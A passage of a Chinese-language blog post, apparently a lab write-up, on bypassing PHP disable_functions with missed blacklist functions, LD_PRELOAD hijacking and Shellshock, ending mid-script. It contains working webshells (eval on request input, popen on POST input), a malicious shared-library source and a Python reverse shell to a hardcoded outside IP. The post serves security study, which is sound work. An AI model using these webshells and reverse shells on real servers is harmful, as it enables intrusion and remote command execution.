<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
  </script>

  <meta property="og:type" content="article">
<meta property="og:title" content="绕过disable_function的限制">
<meta property="og:url" content="http://example.com/2025/04/25/%E7%BB%95%E8%BF%87disable-function%E7%9A%84%E9%99%90%E5%88%B6/index.html">
<meta property="og:site_name" content="路漫漫其修远兮 吾将上下而求索">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-25_20-27-50.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-25_20-30-09.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-25_20-44-11.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-25_20-59-32.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-25_21-04-57.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-25_21-05-46.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-25_21-07-34.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-25_21-36-20.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-25_21-46-24.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-25_21-47-34.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-25_21-48-03.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-25_21-49-53.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-25_21-50-30.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-27_20-06-45.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-27_20-22-59.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-27_20-26-55.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-27_20-31-14.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-27_20-38-24.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-27_20-44-55.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-27_20-47-25.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-27_21-03-37.png">
<meta property="og:image" content="http://example.com/images/image-20250427210757133.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-27_21-12-19.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-27_21-32-30.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-27_21-33-43.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-05-06_18-16-17.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-05-06_18-17-20.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-05-06_18-18-46.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-05-06_19-06-54.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-05-06_19-08-22.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-05-06_19-35-40.png">
<meta property="article:published_time" content="2025-04-25T11:45:43.000Z">
<meta property="article:modified_time" content="2025-05-06T11:53:01.108Z">
<meta property="article:author" content="Cnext">
<meta property="article:tag" content="web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/Snipaste_2025-04-25_20-27-50.png">

<link rel="canonical" href="http://example.com/2025/04/25/%E7%BB%95%E8%BF%87disable-function%E7%9A%84%E9%99%90%E5%88%B6/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>绕过disable_function的限制 | 路漫漫其修远兮 吾将上下而求索</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">路漫漫其修远兮 吾将上下而求索</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/25/%E7%BB%95%E8%BF%87disable-function%E7%9A%84%E9%99%90%E5%88%B6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Cnext">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="路漫漫其修远兮 吾将上下而求索">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          绕过disable_function的限制
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-04-25 19:45:43" itemprop="dateCreated datePublished" datetime="2025-04-25T19:45:43+08:00">2025-04-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-05-06 19:53:01" itemprop="dateModified" datetime="2025-05-06T19:53:01+08:00">2025-05-06</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <html><head></head><body><h1 id="绕过Disable-Function的限制"><a href="/2025/04/25/%E7%BB%95%E8%BF%87disable-function%E7%9A%84%E9%99%90%E5%88%B6/#绕过Disable-Function的限制" class="headerlink" title="绕过Disable_Function的限制"></a>绕过Disable_Function的限制</h1><p><strong>前言</strong></p>
<p>当我们千辛万苦的上传一个shell文件之后，好不容易拿到webshell居然Tmd的无法执行系统命令</p>
<p><img src="/images/Snipaste_2025-04-25_20-27-50.png"></p>
<p>多半是disable_function惹的祸，查看phpinfo确实设置了disable_function</p>
<p><img src="/images/Snipaste_2025-04-25_20-30-09.png"></p>
<p>千辛万苦拿到的shell却变成了一个空壳，不甘心啊，所以就有了今天这一篇总结绕过disablefucntion的文章</p>
<p>使用的环境都是在github上找到的，antsword-labs，使用docker-compose在本地搭建</p>
<h3 id="概念"><a href="/2025/04/25/%E7%BB%95%E8%BF%87disable-function%E7%9A%84%E9%99%90%E5%88%B6/#概念" class="headerlink" title="概念"></a>概念</h3><p>为了安全起见，很多运维人员会禁止使用php中的一些危险函数，例如eval，exec，system等，将其写在php.ini配置文件里面，为了彻底隔离同服务器的用户，以及避免出现大面积的安全问题，disable的设置也是非常严格</p>
<p>如果在渗透的时候，上传了webshell却因为disable_function禁止了我们的函数而无法执行命令的话，这个时候就是想办法要绕过限制，tupodisable_dunction</p>
<h3 id="常规绕过-黑名单绕过"><a href="/2025/04/25/%E7%BB%95%E8%BF%87disable-function%E7%9A%84%E9%99%90%E5%88%B6/#常规绕过-黑名单绕过" class="headerlink" title="常规绕过(黑名单绕过)"></a>常规绕过(黑名单绕过)</h3><p>即便是通过disable functions限制危险函数，也可能会有限制不全的情况。如果运维人员安全意识不强或对PHP不甚了解的话，则很有可能忽略某些危险函数，常见的有以下几种。</p>
<ul>
<li>exec()</li>
</ul>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">exec</span>(<span class="string">'whoami'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<ul>
<li>shell_exec()</li>
</ul>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">'whoami'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<ul>
<li>system()</li>
</ul>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">'whoami'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<ul>
<li>passthru()</li>
</ul>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="string">"whoami"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<ul>
<li>popen()</li>
</ul>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$command</span>=<span class="variable">$_POST</span>[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="variable">$handle</span> = <span class="title function_ invoke__">popen</span>(<span class="variable">$command</span>,<span class="string">"r"</span>);</span><br><span class="line"><span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$handle</span>)){        </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$handle</span>, <span class="number">1024</span>);  <span class="comment">//fread($handle, 1024);</span></span><br><span class="line">}  </span><br><span class="line"><span class="title function_ invoke__">pclose</span>(<span class="variable">$handle</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<ul>
<li>proc_open()</li>
</ul>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$command</span>=<span class="string">"ipconfig"</span>;</span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"w"</span>));</span><br><span class="line"><span class="variable">$handle</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$command</span> ,<span class="variable">$descriptorspec</span> , <span class="variable">$pipes</span>);</span><br><span class="line"><span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$pipes</span>[<span class="number">1</span>])){     </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">1024</span>); <span class="comment">//fgets($pipes[1],1024);</span></span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>还有一个比较常见的易被忽略的函数就是pcntl_exec。</p>
<p><strong>使用条件：</strong></p>
<ul>
<li>PHP安装并启用了pcntl插件</li>
</ul>
<p>pcntl是linux下的一个扩展，可以支持php的多线程操作。很多时候会碰到禁用exec函数的情况，但如果运维人员安全意识不强或对PHP不甚了解，则很有可能忽略pcntl扩展的相关函数。</p>
<p>pcntl_exec()是pcntl插件专有的命令执行函数来执行系统命令函数，可以在当前进程空间执行指定的程序。</p>
<p>利用pcntl_exec()执行test.sh：</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">'pcntl_exec'</span>)) {</span><br><span class="line">   <span class="title function_ invoke__">pcntl_exec</span>(<span class="string">"/bin/bash"</span>, <span class="keyword">array</span>(<span class="string">"/tmp/test.sh"</span>));</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">'pcntl extension is not support!'</span>;</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>由于pcntl_exec()执行命令是没有回显的，所以其常与python结合来反弹shell：</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">pcntl_exec</span>(<span class="string">"/usr/bin/python"</span>,<span class="keyword">array</span>(<span class="string">'-c'</span>,<span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect(("132.232.75.90",9898));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span>));</span><br></pre></td></tr></tbody></table></figure>

<p>下面进入靶场，边打题边学习</p>
<p>靶场具体关卡介绍</p>
<p><img src="/images/Snipaste_2025-04-25_20-44-11.png"></p>
<h3 id="绕过方法"><a href="/2025/04/25/%E7%BB%95%E8%BF%87disable-function%E7%9A%84%E9%99%90%E5%88%B6/#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><h5 id="利用-LD-PRELOAD-环境变量"><a href="/2025/04/25/%E7%BB%95%E8%BF%87disable-function%E7%9A%84%E9%99%90%E5%88%B6/#利用-LD-PRELOAD-环境变量" class="headerlink" title="利用 LD_PRELOAD 环境变量"></a>利用 LD_PRELOAD 环境变量</h5><p><strong>原理简述</strong></p>
<p><code>LD_PRELOAD</code> 是 Linux 和其他类 Unix 系统中的一个环境变量，它允许用户在程序启动时<strong>优先加载指定的共享库（shared libraries）</strong>，覆盖默认的动态链接行为。通过这个机制，开发者可以替换或拦截程序调用的标准库函数，甚至修改程序的行为。</p>
<p><strong>核心作用</strong></p>
<ol>
<li><strong>覆盖函数实现</strong><br>当程序动态链接库函数时，<code>LD_PRELOAD</code> 指定的库会被最先加载，其中的函数会优先于系统标准库（如 <code>libc.so</code>）的同名函数被调用。例如，你可以自定义 <code>malloc</code>、<code>free</code> 或 <code>open</code> 等函数，替换原有的实现。</li>
<li><strong>动态注入代码</strong><br>无需修改程序源代码或重新编译，即可注入自定义代码。常用于调试、性能分析、修复兼容性问题等场景。</li>
</ol>
<p>我们可以通过环境变量LD_PRELOAD 劫持系统函数，可以达到不调用php的各种命令执行函数仍然可以执行系统命令的目的</p>
<p>去github上下载yangyangwithgnu大佬的利用文件</p>
<p>有下面这四个重要的文件</p>
<p><img src="/images/Snipaste_2025-04-25_20-59-32.png"></p>
<ul>
<li>bypass_disablefunc.php：一个用来执行命令的 webshell。</li>
<li>bypass_disablefunc_x64.so或bypass_disablefunc_x86.so：执行命令的共享对象文件，分为64位的和32位的。</li>
<li>bypass_disablefunc.c：用来编译生成上面的共享对象文件。</li>
</ul>
<p>对于bypass_disablefunc.php，权限上传到web目录的直接访问，无权限的话可以传到tmp目录后用include等函数来包含，并且需要用 GET 方法提供三个参数：</p>
<ul>
<li><p>cmd 参数：待执行的系统命令，如 id 命令。</p>
</li>
<li><p>outpath 参数：保存命令执行输出结果的文件路径（如 /tmp/xx），便于在页面上显示，另外该参数，你应注意 web 是否有读写权限、web 是否可跨目录访问、文件将被覆盖和删除等几点。</p>
</li>
<li><p>sopath 参数：指定劫持系统函数的共享对象的绝对路径（如 /var/www/bypass_disablefunc_x64.so），另外关于该参数，你应注意 web 是否可跨目录访问到它。</p>
<p>来到第一关</p>
<p><img src="/images/Snipaste_2025-04-25_21-04-57.png"></p>
<p>没什么过滤，直接连接蚁剑就行</p>
<p><img src="/images/Snipaste_2025-04-25_21-05-46.png"></p>
<p>看到了flag，可惜里面啥都没有，估计是设置成只有root才能看‘</p>
<p>我们尝试上传文件</p>
<p><img src="/images/Snipaste_2025-04-25_21-07-34.png"></p>
<p>将这两个文件上传到目标靶机有权限的目录当中</p>
<p>然后将bypass_disablefunc.php包含进来并使用GET方法提供所需的三个参数：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ant=include("/var/tmp/bypass_disablefunc.php");&amp;cmd=ls&amp;outpath=/tmp/outfile123&amp;sopath=/var/tmp/bypass_disablefunc_x64.so</span><br></pre></td></tr></tbody></table></figure>

<p>但是，居然打不进去，woc，按理说这个so文件应该是通杀的啊，<img src="/images/Snipaste_2025-04-25_21-36-20.png"></p>
<p>我又找了个别的so文件，编写1.c文件如下</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">__attribute__((constructor)) void ajest(){</span><br><span class="line">    unsetenv("LD_PRELOAD");</span><br><span class="line">    if (getenv("CMD") != NULL){</span><br><span class="line">        system(getenv("CMD"));</span><br><span class="line">    }else{</span><br><span class="line">        system("echo 'no cmd' &gt; output");</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>编译文件。</p>
<figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc --share -fPIC hack.c -o hack.so</span><br></pre></td></tr></tbody></table></figure>

<p>将hack.so 文件上传到服务器，并且在服务器上编写文件cmd.php。</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">"CMD=tac /flag &gt; output"</span>);</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">"LD_PRELOAD=./hack.so"</span>);</span><br><span class="line">    <span class="title function_ invoke__">error_log</span>(<span class="string">"a"</span>,<span class="number">1</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>直接通过Web 方式访问该php 文件。查看output 文件内容，即可得到flag。</p>
<p><img src="/images/Snipaste_2025-04-25_21-46-24.png"></p>
<p>还有一个方法就是使用蚁剑自带的绕过disable_function的插件</p>
<p><img src="/images/Snipaste_2025-04-25_21-47-34.png"></p>
<p><img src="/images/Snipaste_2025-04-25_21-48-03.png"></p>
<p>选择LD_PRELOAD模式并点击开始按钮，成功后蚁剑会在 <code>/var/www/html</code> 目录里上传一个 <code>.antproxy.php</code> 文件。我们创建副本, 并将连接的 URL shell 脚本名字改为 <code>.antproxy.php</code>获得一个新的shell，在这个新shell里面就可以成功执行命令了。要查看flag还是要使用suid提权的命令tac</p>
<p><img src="/images/Snipaste_2025-04-25_21-49-53.png"></p>
<p><img src="/images/Snipaste_2025-04-25_21-50-30.png"></p>
<h5 id="利用shellshock"><a href="/2025/04/25/%E7%BB%95%E8%BF%87disable-function%E7%9A%84%E9%99%90%E5%88%B6/#利用shellshock" class="headerlink" title="利用shellshock"></a>利用shellshock</h5><p>利用PHP破壳完成 Bypass</p>
<p>Bash远程代码执行漏洞(CVE-2014-6271)</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  漏洞原理：</span><br><span class="line">目前的Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/Snipaste_2025-04-27_20-06-45.png"></p>
<p>如图，环境还是一样的，但是方法变了，老样子，连接蚁剑，然后依旧无法执行命令，php.ini配置如下</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system</span><br></pre></td></tr></tbody></table></figure>

<p>首先可以使用antsword自带的绕过的方法</p>
</li>
</ul>
<p>然后直接进终端，查看flag就可以了</p>
<p><img src="/images/Snipaste_2025-04-27_20-22-59.png"></p>
<p>首先AntSword 虚拟终端中已经集成了对 ShellShock 的利用, 直接在虚拟终端执行命令即可，<img src="/images/Snipaste_2025-04-27_20-26-55.png"></p>
<p><strong>注意1:</strong></p>
<p>注意看上图中 1 位置的进程树的情况</p>
<p>如果执行命令直接使用 <code>system</code> 等执行命令的函数, 进程列表是这样的:</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data   810   684  0 Jul06 ?        00:00:14 /usr/sbin/apache2 -k start</span><br><span class="line">www-data   909   712  0 00:17 ?        00:00:00 sh -c /bin/sh -c "cd "/var/www/html";ps -aef;echo [S];pwd;echo [E]" 2&gt;&amp;1</span><br><span class="line">www-data   910   909  0 00:17 ?        00:00:00 /bin/sh -c cd /var/www/html;ps -aef;echo [S];pwd;echo [E]</span><br><span class="line">www-data   911   910  0 00:17 ?        00:00:00 ps -aef</span><br></pre></td></tr></tbody></table></figure>

<p>可以不明显的（bushi看出本例中执行命令时, 利用了 PHP <code>error_log</code> 函数在执行 <code>sh -c  -t -i </code> 时, Bash 的 ShellShock 漏洞, 从而实现了执行我们自定义命令的目的。/(ㄒoㄒ)/~~</p>
<p><strong>注意2:</strong></p>
<p>执行了 <code>ls -al /tmp</code>, 可以看到每次都生成了以 <code>as</code> 开头的临时文件, 这就是我们执行完命令之后, 将输出重定向到了临时文件中, 然后再读出来</p>
<p>尝试文件管理直接用 PHP 读 flag, 肯定是读不到的</p>
<p><img src="/images/Snipaste_2025-04-27_20-31-14.png"></p>
<p>我们就可以直接使用tac去终端里直接查看flag，tac有suid权限</p>
<p><strong>手动</strong></p>
<p>有如下几个脚本，挨个解释</p>
<p>利用error_log函数</p>
<p>通过查看phpinfo发现没有ban掉error_log</p>
<p>然后上传脚本</p>
<p>error_log和mail两个函数，都可以使用，（为了避免ban掉一个）</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//默认putenv定义的环境变量名必须以PHP_开头。error_log()函数会在执行sh -c -t -i触发payload</span><br><span class="line">//sh -c -t -i:启动一个Bourne shell，让它执行一个命令字符串（这里没有提供具体的命令字符串），然后输出一个NULL字符并退出，同时保持交互式模式</span><br><span class="line">&lt;?php</span><br><span class="line">  @eval($_REQUEST['ant']);</span><br><span class="line">  putenv("PHP_test=() { :; }; tac /flag &gt;&gt; /var/www/html/test.php");</span><br><span class="line">  error_log("admin",1);</span><br><span class="line">  //mail("admin@localhost","","","","");</span><br><span class="line">?&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>去test.php下面就有flag了了</p>
<p><img src="/images/Snipaste_2025-04-27_20-38-24.png"></p>
<p>然后是另外两个脚本</p>
<p>首先是antsword官方提供的脚本</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function runcmd($c){</span><br><span class="line">  $d = 